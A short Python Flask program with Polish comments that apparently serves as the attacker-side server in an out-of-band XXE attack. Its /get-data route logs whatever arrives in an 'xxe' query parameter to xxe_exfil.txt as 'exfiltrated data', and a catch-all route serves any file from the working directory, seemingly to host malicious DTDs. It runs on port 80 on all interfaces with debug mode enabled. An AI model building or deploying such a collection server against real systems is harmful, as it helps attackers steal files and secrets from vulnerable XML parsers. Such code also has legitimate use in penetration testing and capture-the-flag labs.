from flask import Flask, request, send_from_directory
import os

app = Flask(__name__)

# Ścieżka do katalogu, w którym będą przechowywane pliki
UPLOAD_FOLDER = os.path.abspath(os.getcwd())

@app.route('/')
def home():
    return "Hello, Flask!"

@app.route('/get-data', methods=['GET'])
def get_data():
    # Pobierz wartość parametru `user` z zapytania
    user = request.args.get('xxe')
    if user:
        # Zapisz wartość parametru `user` do pliku
        with open('xxe_exfil.txt', 'a') as file:
            file.write(f'{user}\n')
        return f'XXE exfiltrated data saved: {user} zapisany do pliku'
    else:
        return 'No XXE provided', 400

@app.route('/<filename>', methods=['GET'])
def serve_file(filename):
    # Serwuj plik z katalogu UPLOAD_FOLDER
    try:
        return send_from_directory(UPLOAD_FOLDER, filename)
    except FileNotFoundError:
        return 'File not found', 404

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=80)
